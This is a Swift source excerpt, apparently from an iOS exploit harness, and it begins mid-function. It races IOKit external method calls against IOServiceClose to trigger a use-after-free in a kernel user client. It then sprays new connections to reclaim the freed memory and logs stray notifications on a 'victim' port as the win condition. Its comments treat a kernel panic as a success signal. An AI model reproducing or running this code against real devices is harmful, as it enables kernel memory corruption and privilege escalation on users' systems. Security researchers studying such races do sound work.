                if i <= 3 { emitRace("  [iter \(i)] 0x24 on the victim conn rc=\(krName(rcp)) slot=\(ocp[0]) victimIdx=\(goodIdx)") }
            }

            let nT = max(1, nThreads)
            let flags = UnsafeMutablePointer<Int32>.allocate(capacity: nT)
            for k in 0..<nT { flags[k] = 0 }

            var threads: [Thread] = []
            for t in 0..<nT {
                let th = Thread { raceLoop(ctx, tid: t, nthreads: nT, flags: flags) }
                th.stackSize = 1 << 20
                threads.append(th)
            }
            for t in threads { t.start() }

            if closeDelayUS > 0 { usleep(UInt32(closeDelayUS)) }
            ctx.closing = 1
            let t0 = DispatchTime.now().uptimeNanoseconds
            _ = xq_IOServiceClose(c)          // <-- the teardown race
            let closeUS = (DispatchTime.now().uptimeNanoseconds - t0) / 1000
            ctx.closed = 1
            ctx.stop = 1
            if i <= 5 || i % 25 == 0 {
                emitRace("  [iter \(i)] close took \(closeUS) us")
            }

            var spins = 0
            var allDone = false
            while spins < 4000 {
                allDone = true
                for k in 0..<nT { if flags[k] == 0 { allDone = false; break } }
                if allDone { break }
                usleep(50); spins += 1
            }
            if !allDone { emitRace("  [iter \(i)] threads still running after wait") }
            flags.deallocate()
            totalOps += ctx.ops
            totalOKSet += ctx.okSet
            totalErrSet += ctx.errSet
            totalLate += ctx.lateOK
            totalAfter += ctx.afterOK

            var trigCtl = 0
            for _ in 0..<max(1, drainPerIter) { trigCtl += fireTrigger() }

            // control: the framework-client registration fires on every trigger
            let ctl = trigCtl
            // win: any victim registration that outlived its client
            let stale = recvCount(port)
            totalCtl += ctl
            if stale > 0 {
                totalStale += stale
                if staleIters.count < 20 { staleIters.append(i) }
                emitRace("  *** iter \(i): \(stale) notification(s) on the VICTIM port after close ***")
            }

            // churn the user-client zone so the freed client is reclaimed by a
            // live connection.  If that connection owns a notify-table entry
            // at the dispatch index, the dangling node resolves to it and the
            // notification lands on the VICTIM port: that is the win signal.
            // (If it instead resolves to foreign memory, the PAC check in
            // lookup() fires and the kernel panics - also a win signal.)
            var spray: [io_connect_t] = []
            for _ in 0..<32 {
                let s = openConn()
                if s != 0 {
                    spray.append(s)
                    if shapeOK && workingProbeIdx >= 0 {
                        var scs: [UInt64] = [UInt64(workingProbeIdx)]
                        var ocs: [UInt64] = [0, 0]
                        var ocnts: UInt32 = 2
                        _ = scs.withUnsafeMutableBufferPointer { ib in
                            ocs.withUnsafeMutableBufferPointer { ob in
                                gCallMethod(s, 0x24, UnsafePointer(ib.baseAddress), 1, nil, 0,
                                            ob.baseAddress, &ocnts, nil, nil)
                            }
                        }
                    }
                }
            }
            let ctl2 = fireTrigger()
            totalCtl += ctl2
            let stale2 = recvCount(port)
            if stale2 > 0 {
                totalStale += stale2
                if staleIters.count < 20 { staleIters.append(i) }
                emitRace("  *** iter \(i): \(stale2) notification(s) on the VICTIM port after reclaim ***")
            }
            for s in spray { _ = xq_IOServiceClose(s) }

            if i % 5 == 0 || i <= 3 {
                emitRace("[\(i)/\(iters)] ops=\(totalOps) setOK=\(totalOKSet) setErr=\(totalErrSet) late=\(totalLate) after=\(totalAfter) ctl=\(totalCtl) stale=\(totalStale) trig=\(triggerOK)/\(triggerOK + triggerFail)")
            }
            if i % 25 == 0 { try? await Task.sleep(nanoseconds: 20_000_000) }
        }
        }

        emitRace("\n=== done: \(iters) iterations, \(totalOps) sets, setOK=\(totalOKSet) setErr=\(totalErrSet) ===")
        emitRace("triggers: ok=\(triggerOK) fail=\(triggerFail)")
        emitRace("control notifications: \(totalCtl)   VICTIM notifications: \(totalStale)")
        if !staleIters.isEmpty { emitRace("stale at iterations: \(staleIters)") }
        for s in victimSurfaces { /* leak: releasing IOSurface refs double-frees them */ }
        for s in reqSurfaces { /* leak: releasing IOSurface refs double-frees them */ }
        _ = xq_IOServiceClose(connB)
        status = "Complete"; isRunning = false
    }
}

// ---- raw thread body (no Swift concurrency, no actor isolation) --------------
private func raceLoop(_ ctx: RaceCtx, tid: Int, nthreads: Int, flags: UnsafeMutablePointer<Int32>) {
    let ids = ctx.ids
    let port = ctx.port
    let stride = max(1, nthreads)
    guard let setWrap = ctx.setWrap else { flags[tid] = 1; return }
    var idx = tid
    while ctx.stop == 0 {
        if idx >= ids.count { idx = tid }
        let id = ids[idx]
        idx += stride
        var inSet: (UInt64, UInt64, UInt64) = (UInt64(port), 1, UInt64(id))
        var outSet: (UInt64, UInt64, UInt64) = (1, UInt64(id), ctx.victimIdx)
        let rs: Int32 = withUnsafePointer(to: &inSet) { ip in
            withUnsafePointer(to: &outSet) { op in
                setWrap(ctx.conn, 0x11, UInt64(port), UnsafeRawPointer(ip), 3, 0, 0,
                        UnsafeRawPointer(op), 0x18, 0, 0, 0, 0)
            }
        }
        if rs == 0 {
            ctx.okSet += 1
            if ctx.closing == 1 {
                ctx.lateOK += 1
                if ctx.closed == 1 { ctx.afterOK += 1 }
            }
        } else { ctx.errSet += 1; ctx.lastErr = rs }
        ctx.ops += 1
    }
    flags[tid] = 1
}

// mach_task_self is not exposed by the Darwin module on iOS
@_silgen_name("mach_task_self")
func mach_task_self() -> mach_port_t
